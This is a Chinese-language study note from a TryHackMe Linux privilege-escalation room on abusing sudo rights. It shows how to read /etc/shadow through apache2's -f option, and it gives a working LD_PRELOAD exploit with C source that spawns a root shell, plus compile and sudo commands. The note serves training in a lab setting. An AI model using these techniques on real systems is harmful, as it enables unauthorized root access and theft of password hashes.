> [!info] LINK & TAG
> [TryHackMe | Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)
> 
> #tag

# Linux 提權：Sudo 權限濫用 (Sudo Rights Exploitation)

## 1. Sudo 權限基礎

`sudo` 指令通常允許使用者以 **root** 權限執行程式。系統管理員有時會針對特定指令進行授權（例如允許 SOC 分析師僅能以 root 執行 `nmap`）。

- **檢查指令**：使用 `sudo -l` 查看當前使用者被授權的 sudo 指令列表。
    
- **核心資源**：[GTFOBins](https://gtfobins.github.io/) 是查詢如何利用具備 sudo 權限的二進位檔案進行提權的百科全書。
    

---

## 2. 利用應用程式功能 (Leveraging App Functions)

有些程式雖然沒有直接的溢位漏洞，但其設計功能（如讀取設定檔）可被用來外洩敏感資訊。

- **案例：Apache2**
    
    - **原理**：Apache2 提供 `-f` 參數來指定替代的設定檔（ServerConfigFile）。
        
    - **手法**：嘗試加載非設定檔（如 `/etc/shadow`）。
        
    - **結果**：Apache 會因為格式錯誤而噴出錯誤訊息，但該訊息中往往會包含 `/etc/shadow` 的第一行內容（包含 root 的密碼雜湊值）。
        

---

## 3. 利用 LD_PRELOAD 環境變數

`LD_PRELOAD` 是一個功能強大的環境變數，它允許程式在啟動時先載入指定的共享函式庫（Shared Libraries）。如果 `sudo -l` 的輸出中包含 `env_keep += LD_PRELOAD`，則可以利用此機制提權。

### 提權步驟 (Exploitation Steps)

1. **確認環境**：執行 `sudo -l` 確保看到 `env_keep` 包含 `LD_PRELOAD`。
    
2. **撰寫 C 語言代碼**：建立一個名為 `shell.c` 的檔案，其目的是在初始化時啟動 `/bin/bash` 並將 UID/GID 設為 0 (root)。
    


```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD"); // 清除變數避免無限迴圈
    setgid(0);              // 設為 root 群組
    setuid(0);              // 設為 root 用戶
    system("/bin/bash");    // 啟動 Shell
}
```

3. **編譯為共享物件 (.so)**：
    
    Bash
    
    ```
    gcc -fPIC -shared -o shell.so shell.c -nostartfiles
    ```
    
4. 執行並提權：
    
    指定 LD_PRELOAD 路徑並運行任何你有權限以 sudo 執行的指令（例如 find 或 apache2）。
    
    Bash
    
    ```
    sudo LD_PRELOAD=/home/user/shell.so find
    ```
    

> [!IMPORTANT]
> 
> 限制條件：如果真實使用者 ID (RUID) 與有效使用者 ID (EUID) 不同，系統將會忽略 LD_PRELOAD 選項。

---

## 4. 關鍵知識總結表

|**技巧**|**必要條件**|**提權目標**|
|---|---|---|
|**GTFOBins**|`sudo -l` 列出特定程式|獲取 Root Shell|
|**功能濫用**|程式具備讀取檔案參數 (如 `-f`, `-r`)|讀取機密檔案 (如 `/etc/shadow`)|
|**LD_PRELOAD**|`sudo -l` 顯示 `env_keep` 包含該變數|劫持程序啟動流程以執行惡意代碼|
